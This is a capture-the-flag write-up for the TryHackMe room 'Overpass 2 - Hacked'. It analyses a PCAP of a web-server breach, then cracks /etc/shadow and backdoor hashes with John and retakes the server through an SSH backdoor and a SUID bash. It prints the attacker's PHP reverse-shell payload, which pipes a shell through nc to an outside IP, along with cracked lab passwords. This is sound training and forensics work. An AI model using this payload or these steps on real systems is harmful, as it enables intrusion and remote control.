<p align="center">
  THM : Overpass 2 - Hacked<br>
  Difficulty : Easy<br>
  <img src="https://i.imgur.com/xEn9XFh.jpg">
</p>

## Summary

- [Analysing PCAP file using Wireshark](#analysing-pcap-file-using-wireshark)
- [Cracking /etc/shadow hashes](#cracking-etcshadow-hashes)
- [Analysing the backdoor code](#analysing-the-backdoor-code)
- [Taking control of Overpass production server](#taking-control-of-overpass-production-server)
- [Conclusion](#conclusion)

## Analysing PCAP file using Wireshark

First, let's download the pcap file and open it with Wireshark. On packet number 6 we can see the HTTP source code of /development/ wich contains an upload form :  
![](https://i.imgur.com/YVBEzQh.jpg)  
![](https://i.imgur.com/SWGu24K.jpg)  

**Question : What was the URL of the page they used to upload a reverse shell ?**  
**Answer : /development/**  

Then, we can see in packet 14 a POST request to /development/upload.php. Let's see what was uploaded in this request :  
![](https://i.imgur.com/OpTqvQu.jpg)  
![](https://i.imgur.com/DSl75Ix.jpg)  

We can find the php payload used by the attacker to get a reverse shell.

**Question : What payload did the attacker use to gain access ?**  
**Answer : `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`**  

Looking at packet 32, we can see the beginning of a shell session. Probably the reverse shell of the attacker :  
![](https://i.imgur.com/RLRNkSG.jpg)  
![](https://i.imgur.com/hTUZw4o.jpg)  

Let's right click this packet and select Follow -> TCP Stream :  
![](https://i.imgur.com/fCCHNBw.jpg)  

We can now see everything the attacker have done using his reverse shell. He used a password to escalate his privileges :  
![](https://i.imgur.com/MdN0Cwp.jpg)  

**Question : What password did the attacker use to privesc ?**  
**Answer : whenevernoteartinstant**  

We can see the attacker used a backdoor downloaded from Github to establish persistence :  
![](https://i.imgur.com/brpuTKn.jpg)  

**Question : How did the attacker establish persistence ?**  
**Answer : https://github.com/NinjaJc01/ssh-backdoor**  

## Cracking /etc/shadow hashes

Now, we are asked how many password hashes present in /etc/shadow are crackable using the fasttrack.txt wordlist. The attacker was able to read /etc/shadow, so we 
just need to copy all the hashes in a file (one hash per line) : 
![](https://i.imgur.com/dnqxTZG.jpg)  

Now we can use [John](https://www.openwall.com/john/) to try to crack them :  
```
attacker@AttackBox:~$ john hashes.txt -w=fasttrack.txt
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE4.1 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
secuirty3        (paradox)     
secret12         (bee)     
abcd123          (szymex)     
1qaz2wsx         (muirland)     
4g 0:00:00:01 DONE (2022-12-18 19:59) 3.508g/s 194.7p/s 891.2c/s 891.2C/s admin..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

**Question : Using the fasttrack wordlist, how many of the system passwords were crackable ?**  
**Answer : 4**  

## Analysing the backdoor code

Let's take a look at https://github.com/NinjaJc01/ssh-backdoor. We can find the default hash in main.go :  
![](https://i.imgur.com/6CAtlIK.jpg)  

**Question : What's the default hash for the backdoor ?**  
**Answer : bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3**  

We can also find the hardcoded salt :  
![](https://i.imgur.com/2Perzuy.jpg)  

**Question : What's the hardcoded salt for the backdoor ?**  
**Answer : 1c362db832f3f864c8c2fe05f2002a05**  

Now, we have to find what hash was used by the attacker when he set up the backdoor. Let's go back to our pcap file :  
![](https://i.imgur.com/hST16uN.jpg)  

**Question : What was the hash that the attacker used ? - go back to the PCAP for this!**  
**Answer : 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed**  

Let's crack this hash and don't forget to add the salt like so : [hash]$[salt]. Also, don't forget to specify the hash type using the `--format` parameter (you can find the hash type 
by using online tools like [Hashes.com](https://hashes.com/en/tools/hash_identifier)) :  
![](https://i.imgur.com/aipfm5M.jpg)  

Now we know it's a SHA512 hash. The format for SHA512 + salt is `dynamic=sha512($p.$s)`
```
attacker@AttackBox:~$ echo '6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed$1c362db832f3f864c8c2fe05f2002a05' > hash.txt
attacker@AttackBox:~$ cat hash.txt 
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed$1c362db832f3f864c8c2fe05f2002a05
attacker@AttackBox:~$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format='dynamic=sha512($p.$s)'
Using default input encoding: UTF-8
Loaded 1 password hash (dynamic=sha512($p.$s) [128/128 SSE4.1 2x])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
november16       (?)     
1g 0:00:00:00 DONE (2022-12-18 21:25) 10.00g/s 184800p/s 184800c/s 184800C/s woodside..nokian70
Use the "--show --format=dynamic=sha512($p.$s)" options to display all of the cracked passwords reliably
Session completed. 
attacker@AttackBox:~$
```

**Question : Crack the hash using rockyou and a cracking tool of your choice. What's the password ?**  
**Answer : november16**  

## Taking control of Overpass production server

It is asked to find out what message was left on the web server. Let's take a look using a web browser :  
![](https://i.imgur.com/87yaONF.jpg)  

**Question : The attacker defaced the website. What message did they leave as a heading ?**  
**Answer : H4ck3d by CooctusClan**  

We already know the credentials for the backdoor (james:november16), we need to find out on what port the backdoor is running. We can see this in the source code 
on Github :  
![](https://i.imgur.com/8F4aL0l.jpg)  

Now, we know the backdoor is running on port 2222. Let's connect to it :  
```
attacker@AttackBox:~$ ssh james@10.10.5.198 -p 2222
The authenticity of host '[10.10.5.198]:2222 ([10.10.5.198]:2222)' can't be established.
RSA key fingerprint is SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.5.198]:2222' (RSA) to the list of known hosts.
james@10.10.5.198's password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

james@overpass-production:/home/james/ssh-backdoor$
```

We are now logged in as james. Let's get the user.txt flag :  
```
james@overpass-production:/home/james/ssh-backdoor$ cd ..
james@overpass-production:/home/james$ ls
ssh-backdoor  user.txt  www
james@overpass-production:/home/james$ cat user.txt 
thm{***************************}
```

**Question : What's the user flag ?**  
**Answer : thm{_HIDDEN_}**  

Now, it's time to get root ! If we look for hidden files in /home/james using `ls -la`, we can find something interesting :  
```
james@overpass-production:/home/james$ ls -la
total 1136
drwxr-xr-x 7 james james    4096 Jul 22  2020 .
drwxr-xr-x 7 root  root     4096 Jul 21  2020 ..
lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
drwx------ 2 james james    4096 Jul 21  2020 .cache
drwx------ 3 james james    4096 Jul 21  2020 .gnupg
drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
-rw------- 1 james james      51 Jul 21  2020 .overpass
-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
-rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
-rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
drwxrwxr-x 7 james james    4096 Jul 21  2020 www
```

There is a file named .suid_bash that has the SUID bit set and the owner of this file is root... So let's execute it using `-p` option and see if it works :  
```
james@overpass-production:/home/james$ ./.suid_bash -p
.suid_bash-4.4# whoami
root
.suid_bash-4.4#
```

And we are root ! Let's get the root flag now :  
```
.suid_bash-4.4# cd /root
.suid_bash-4.4# ls
root.txt
.suid_bash-4.4# cat root.txt
thm{****************************}
.suid_bash-4.4# 
```

**Question : What's the root flag ?**  
**Answer : thm{_HIDDEN_}**  

## Conclusion

I liked this room. The fact that we have to investigate the attack to find a way to take back the control of the server is very cool. Thanks for this room !
